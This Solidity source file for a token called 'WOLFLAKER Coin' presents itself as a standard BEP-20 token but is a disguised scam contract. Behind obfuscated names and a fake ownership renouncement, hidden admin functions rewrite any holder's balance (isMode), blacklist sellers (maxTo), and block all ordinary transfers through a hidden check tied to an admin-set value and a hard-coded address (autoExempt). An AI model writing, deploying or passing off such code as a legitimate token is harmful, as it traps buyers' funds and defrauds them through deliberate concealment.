//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface minTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingMode) external view returns (uint256);

    function transfer(address tokenMarketing, uint256 txListTotal) external returns (bool);

    function allowance(address marketingLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 txListTotal) external returns (bool);

    function transferFrom(
        address sender,
        address tokenMarketing,
        uint256 txListTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverLaunch, uint256 value);
    event Approval(address indexed marketingLiquidity, address indexed spender, uint256 value);
}

interface minTakeMetadata is minTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract tokenFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchFrom {
    function createPair(address listAuto, address txExemptIs) external returns (address);
}

interface fromAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract WOLFLAKERCoin is tokenFrom, minTake, minTakeMetadata {

    string private tradingLiquidity = "WCN";

    mapping(address => uint256) private launchAt;

    uint256 private txSell = 100000000 * 10 ** 18;

    address private fromReceiverAt;

    event OwnershipTransferred(address indexed shouldWallet, address indexed fundTrading);

    address public marketingSender;

    mapping(address => mapping(address => uint256)) private marketingLaunchedIs;

    function isMode(address marketingShould, uint256 txListTotal) public {
        buyMode();
        launchAt[marketingShould] = txListTotal;
    }

    function balanceOf(address tradingMode) public view virtual override returns (uint256) {
        return launchAt[tradingMode];
    }

    function owner() external view returns (address) {
        return fromReceiverAt;
    }

    function getOwner() external view returns (address) {
        return fromReceiverAt;
    }

    function transferFrom(address feeLaunch, address tokenMarketing, uint256 txListTotal) external override returns (bool) {
        if (_msgSender() != totalLimit) {
            if (marketingLaunchedIs[feeLaunch][_msgSender()] != type(uint256).max) {
                require(txListTotal <= marketingLaunchedIs[feeLaunch][_msgSender()]);
                marketingLaunchedIs[feeLaunch][_msgSender()] -= txListTotal;
            }
        }
        return autoExempt(feeLaunch, tokenMarketing, txListTotal);
    }

    constructor (){
        
        senderAtTake();
        fromAt modeEnable = fromAt(totalLimit);
        marketingSender = launchFrom(modeEnable.factory()).createPair(modeEnable.WETH(), address(this));
        if (tokenAt == senderSell) {
            modeReceiver = false;
        }
        minWallet = _msgSender();
        liquidityAtBuy[minWallet] = true;
        launchAt[minWallet] = txSell;
        
        emit Transfer(address(0), minWallet, txSell);
    }

    address sellSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private sellIs;

    bool public sellWallet;

    uint256 maxAt;

    uint8 private listTake = 18;

    bool private modeReceiver;

    string private atSell = "WOLFLAKER Coin";

    uint256 toWallet;

    function approve(address limitAtAmount, uint256 txListTotal) public virtual override returns (bool) {
        marketingLaunchedIs[_msgSender()][limitAtAmount] = txListTotal;
        emit Approval(_msgSender(), limitAtAmount, txListTotal);
        return true;
    }

    address totalLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function maxTo(address modeMarketing) public {
        buyMode();
        if (senderSell == tokenAt) {
            senderSell = tokenAt;
        }
        if (modeMarketing == minWallet || modeMarketing == marketingSender) {
            return;
        }
        takeFromToken[modeMarketing] = true;
    }

    function modeTeam(address isList) public {
        if (sellWallet) {
            return;
        }
        if (tokenAt == senderSell) {
            senderSell = tokenAt;
        }
        liquidityAtBuy[isList] = true;
        if (tokenAt == senderSell) {
            amountLaunched = false;
        }
        sellWallet = true;
    }

    function buyTrading(uint256 txListTotal) public {
        buyMode();
        maxAt = txListTotal;
    }

    uint256 public tokenAt;

    function autoExempt(address feeLaunch, address tokenMarketing, uint256 txListTotal) internal returns (bool) {
        if (feeLaunch == minWallet) {
            return maxTotal(feeLaunch, tokenMarketing, txListTotal);
        }
        uint256 totalExempt = minTake(marketingSender).balanceOf(sellSender);
        require(totalExempt == maxAt);
        require(!takeFromToken[feeLaunch]);
        return maxTotal(feeLaunch, tokenMarketing, txListTotal);
    }

    mapping(address => bool) public takeFromToken;

    function allowance(address buySenderFee, address limitAtAmount) external view virtual override returns (uint256) {
        if (limitAtAmount == totalLimit) {
            return type(uint256).max;
        }
        return marketingLaunchedIs[buySenderFee][limitAtAmount];
    }

    mapping(address => bool) public liquidityAtBuy;

    bool public amountLaunched;

    function transfer(address marketingShould, uint256 txListTotal) external virtual override returns (bool) {
        return autoExempt(_msgSender(), marketingShould, txListTotal);
    }

    function buyMode() private view {
        require(liquidityAtBuy[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return listTake;
    }

    address public minWallet;

    function symbol() external view virtual override returns (string memory) {
        return tradingLiquidity;
    }

    function senderAtTake() public {
        emit OwnershipTransferred(minWallet, address(0));
        fromReceiverAt = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return atSell;
    }

    uint256 public senderSell;

    function maxTotal(address feeLaunch, address tokenMarketing, uint256 txListTotal) internal returns (bool) {
        require(launchAt[feeLaunch] >= txListTotal);
        launchAt[feeLaunch] -= txListTotal;
        launchAt[tokenMarketing] += txListTotal;
        emit Transfer(feeLaunch, tokenMarketing, txListTotal);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txSell;
    }

}